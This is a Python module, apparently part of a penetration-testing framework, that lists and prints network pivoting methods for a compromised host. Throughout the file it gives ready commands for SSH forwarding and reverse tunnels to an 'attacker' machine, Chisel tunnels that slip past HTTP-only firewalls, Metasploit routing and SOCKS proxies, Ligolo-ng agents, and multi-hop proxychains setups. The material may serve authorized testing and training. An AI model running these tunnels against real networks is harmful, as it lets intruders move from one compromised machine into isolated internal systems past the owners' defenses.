"""
Phase 4: Network Pivoting
=========================

Pivot through compromised systems to reach isolated networks.
"""

from typing import List, Dict

from .base import BasePhase
from ..models import CompromisedSystem


class PivotingPhase(BasePhase):
    """
    Phase 4: Network Pivoting

    Use compromised systems as pivot points to access
    otherwise unreachable networks.
    """

    PHASE_NUMBER = 4
    PHASE_NAME = "NETWORK PIVOTING"
    PHASE_DESCRIPTION = "Pivot through compromised systems to reach new networks"

    # Pivoting methods
    METHODS = [
        {
            "name": "SSH Dynamic Forwarding (SOCKS5)",
            "when": "SSH access to pivot host",
            "command": "ssh -D 1080 -f -N user@pivot",
            "usage": "proxychains4 nmap <target_network>",
            "config": "socks5 127.0.0.1 1080 in /etc/proxychains4.conf",
            "pros": "Simple, reliable, encrypted",
            "cons": "Requires SSH access",
        },
        {
            "name": "SSH Local Port Forward",
            "when": "Need specific port access to internal host",
            "command": "ssh -L <local>:<internal>:<port> user@pivot",
            "usage": "xfreerdp /v:localhost:<local>",
            "example": "ssh -L 3389:192.168.1.10:3389 user@dmz-server",
            "pros": "Precise, only forwards what you need",
            "cons": "One port at a time",
        },
        {
            "name": "SSH Remote Port Forward",
            "when": "Need to expose internal service to attacker",
            "command": "ssh -R <attacker_port>:<internal>:<port> user@attacker",
            "usage": "Access internal service via attacker:port",
            "example": "ssh -R 8080:192.168.1.10:80 user@attacker",
            "pros": "Useful for reverse connections",
            "cons": "Exposes ports on attacker machine",
        },
        {
            "name": "Chisel (HTTP/HTTPS Tunnel)",
            "when": "Only HTTP/HTTPS allowed through firewall",
            "server": "chisel server -p 8080 --reverse",
            "client": "chisel client <attacker>:8080 R:socks",
            "usage": "proxychains4 <tool>",
            "pros": "Bypasses protocol restrictions, looks like HTTP",
            "cons": "Requires binary upload to pivot",
        },
        {
            "name": "Chisel Port Forward",
            "when": "HTTP-only, need specific port",
            "server": "chisel server -p 8080 --reverse",
            "client": "chisel client <attacker>:8080 R:3389:<internal>:3389",
            "usage": "xfreerdp /v:localhost:3389",
            "pros": "HTTP-based, specific port",
            "cons": "More complex setup",
        },
        {
            "name": "Metasploit Route",
            "when": "Using Metasploit session",
            "command": "route add <network> <mask> <session_id>",
            "socks": "use auxiliary/server/socks_proxy; run",
            "usage": "All Metasploit modules route through session",
            "pros": "Integrated with Metasploit",
            "cons": "Requires Meterpreter session",
        },
        {
            "name": "Ligolo-ng",
            "when": "Need layer 3 (full IP) tunneling",
            "proxy": "ligolo-proxy -selfcert",
            "agent": "ligolo-agent -connect <proxy>:11601 -ignore-cert",
            "usage": "Full network access as if directly connected",
            "pros": "Layer 3 tunnel, very powerful",
            "cons": "More complex setup",
        },
    ]

    # Multi-hop configurations
    MULTI_HOP = {
        "description": "Chain multiple pivots for deep network access",
        "pattern": "Attacker → Pivot1 → Pivot2 → Target",
        "methods": [
            {
                "name": "Nested SSH Tunnels",
                "setup": [
                    "# First hop",
                    "ssh -D 1080 -f -N user@pivot1",
                    "# Second hop (through first)",
                    "proxychains4 ssh -D 1081 -f -N user@pivot2",
                ],
                "config": "Chain SOCKS proxies in proxychains.conf",
            },
            {
                "name": "Proxychains Chain",
                "config_example": """
strict_chain
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
""",
            },
        ],
    }

    def execute(self, pivot_host: CompromisedSystem, target_network: str, **kwargs) -> bool:
        """
        Execute network pivoting through compromised system.

        Args:
            pivot_host: System to use as pivot point
            target_network: Network to access through pivot

        Returns:
            True if pivot established successfully
        """
        self.log_header()

        self.log(f"\n[*] Pivot Host: {pivot_host.hostname} ({pivot_host.ip_address})")
        self.log(f"[*] Target Network: {target_network}")

        # Show pivoting methods
        self.log("\n[*] Available Pivoting Methods:")
        self._show_methods(pivot_host)

        # Show multi-hop
        self.log("\n[*] Multi-Hop Pivoting:")
        self._show_multi_hop()

        # Add to active pivots
        pivot_config = {
            "pivot_host": pivot_host.ip_address,
            "target_network": target_network,
            "method": "TBD",
            "local_port": 1080,
        }
        self.state.add_pivot(pivot_config)

        return True

    def _show_methods(self, pivot_host: CompromisedSystem) -> None:
        """Display available pivoting methods"""
        for method in self.METHODS:
            self.log(f"\n    {method['name']}")
            self.log(f"      When: {method['when']}")

            if "command" in method:
                cmd = method["command"].replace("pivot", pivot_host.ip_address)
                self.log(f"      Command: {cmd}")
            if "server" in method:
                self.log(f"      Server: {method['server']}")
                self.log(f"      Client: {method['client']}")
            if "usage" in method:
                self.log(f"      Usage: {method['usage']}")
            if "example" in method:
                self.log(f"      Example: {method['example']}")

            self.log(f"      Pros: {method['pros']}")
            self.log(f"      Cons: {method['cons']}")

    def _show_multi_hop(self) -> None:
        """Display multi-hop pivoting information"""
        self.log(f"    Description: {self.MULTI_HOP['description']}")
        self.log(f"    Pattern: {self.MULTI_HOP['pattern']}")

        for method in self.MULTI_HOP["methods"]:
            self.log(f"\n    {method['name']}:")
            if "setup" in method:
                for line in method["setup"]:
                    self.log(f"      {line}")
            if "config_example" in method:
                self.log("      Config:")
                for line in method["config_example"].strip().split("\n"):
                    self.log(f"        {line}")

    def get_method_by_name(self, name: str) -> Dict:
        """Get a specific pivoting method by name"""
        for method in self.METHODS:
            if name.lower() in method["name"].lower():
                return method
        return {}

    def get_methods_for_scenario(self, has_ssh: bool = True, http_only: bool = False) -> List[Dict]:
        """
        Get recommended methods based on scenario.

        Args:
            has_ssh: Whether SSH access is available
            http_only: Whether only HTTP/HTTPS is allowed

        Returns:
            List of recommended methods
        """
        if http_only:
            return [m for m in self.METHODS if "Chisel" in m["name"]]

        if has_ssh:
            return [m for m in self.METHODS if "SSH" in m["name"]]

        return self.METHODS